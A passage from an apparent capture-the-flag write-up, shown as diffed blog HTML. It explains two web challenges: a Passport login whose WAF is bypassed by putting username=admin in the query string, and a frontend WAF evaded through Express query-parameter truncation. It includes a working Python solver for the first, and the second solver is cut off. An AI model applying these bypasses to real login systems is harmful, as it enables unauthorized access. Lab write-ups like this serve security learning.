+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/login?message=admin%20detected&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">use</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LocalStrategy</span>(
+</span></span><span style="display:flex;"><span>  (<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">done</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">serializeUser</span>((<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">done</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">user</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">deserializeUser</span>((<span style="color:#a6e22e">user</span>, <span style="color:#a6e22e">done</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">user</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/login&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">GZCTF_FLAG</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;no flag for you&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">message</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#34;login.ejs&#34;</span>, {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/login&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">waf</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">authenticate</span>(<span style="color:#e6db74">&#34;local&#34;</span>,
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">failureRedirect</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/login&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">successRedirect</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
+</span></span></code></pre></div><p>The goal is to get flag via logging in as admin. admin password is hardcoded in the source code.</p>
+<p>app/src/routes/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#a6e22e">passport</span>.<span style="color:#a6e22e">use</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LocalStrategy</span>(
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>  (<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>, <span style="color:#a6e22e">done</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, { <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;admin&#34;</span> });
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">done</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>));
+</span></span></code></pre></div><p>However, username admin is blocked by WAF.</p>
+<p>app/src/routes/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">waf</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">username</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">username</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/login?message=admin%20detected&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>  <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>}
+</span></span></code></pre></div><p>To log in as admin, the following situation is needed.</p>
+<ul>
+<li>waf sees username as something that is not admin</li>
+<li>web app sees username as admin</li>
+</ul>
+<p>This web app uses Passport with LocalStrategy. Looking at the source of LocalStrategy, interesting code can be found.</p>
+<p><a href="https://github.com/jaredhanson/passport-local/blob/v1.0.0/lib/strategy.js#L71">https://github.com/jaredhanson/passport-local/blob/v1.0.0/lib/strategy.js#L71</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">97</span><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lookup</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_usernameField</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">lookup</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">_usernameField</span>);
+</span></span></code></pre></div><p>LocalStrategy actually retrieves username from query parameter if there isn&rsquo;t one in req.body. Since WAF is only looking at req.body.username and doesn&rsquo;t throw an error when req.body.username is null, it is possible to bypass WAF.</p>
+<h2 id="solution-1">Solution</h2>
+<p>Here is the solution.</p>
+<p>solve.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(conflict_handler<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;resolve&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base url of the app&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parse_args()
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
+</span></span><span style="display:flex;"><span>ses <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>ses<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/login?username=admin&#34;</span>, headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>}, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password=admin&#34;</span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> ses<span style="color:#f92672">.</span>get(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 solve.py -u http://localhost:3000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sknb<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="parse-parse-parse">Parse Parse Parse</h1>
+<p>The following is the challenge source code.</p>
+<p>app/frontend/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;node:fs&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">backendBaseUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">waf</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">mode</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mode</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mode</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;./views/home.html&#34;</span>).<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">html</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">waf</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">user</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;no hacking&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">backendBaseUrl</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">url</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`app is running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>app/backend/src/index.ts</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ts" data-lang="ts"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">serve</span> } <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#39;@hono/node-server&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">Hono</span> } <span style="color:#66d9ef">from</span> <span style="color:#e6db74">&#39;hono&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Hono</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#66d9ef">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">c</span>) <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;user&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">user</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">&#34;invalid request&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">user</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;admin&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">text</span>(<span style="color:#e6db74">&#34;this endpoint is only available to admin&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">text</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">GZCTF_FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;sknb{REDACTED}&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">serve</span>({
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>: <span style="color:#66d9ef">app.fetch</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">port</span>: <span style="color:#66d9ef">80</span>
+</span></span><span style="display:flex;"><span>}, (<span style="color:#a6e22e">info</span>) <span style="color:#f92672">=&gt;</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Server is running on http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">info</span>.<span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The goal is to retrieve the flag by setting req.query.user to admin, however WAF is blocking it in frontend.</p>
+<p>app/frontend/index.js</p>
+<div class="highlight" linestartno="9"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">waf</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">mode</span>) =&gt; {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mode</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mode</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>}
+</span></span></code></pre></div><p>In frontend, it uses Express. In Express, it is possible to set max parameter size with parameterLimit(default: 1000). When the size of parameter is over parameterLimit, it truncates the value after length over parameterLimit.</p>
+<blockquote>
+<p>The issue here is that if I have a really long query param(over 1000) ie. test?ids[]=1&amp;ids[]=2&hellip;, it will truncate the value after length over 1000. This is because the qs library has a default parameterLimit of 1000 which then it won&rsquo;t parse any more value after. It seems in express body parser, this issue also exists but it returns an error if it is over a limit.</p>
+<p><a href="https://github.com/expressjs/express/issues/5878">https://github.com/expressjs/express/issues/5878</a></p>
+</blockquote>
+<p>Since frontend has no null check on req.query.user, it is possible to bypass WAF.</p>
+<h2 id="solution-2">Solution</h2>
+<p>Here is solver.</p>
+<p>solve.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(conflict_handler<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;resolve&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base url of the app&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
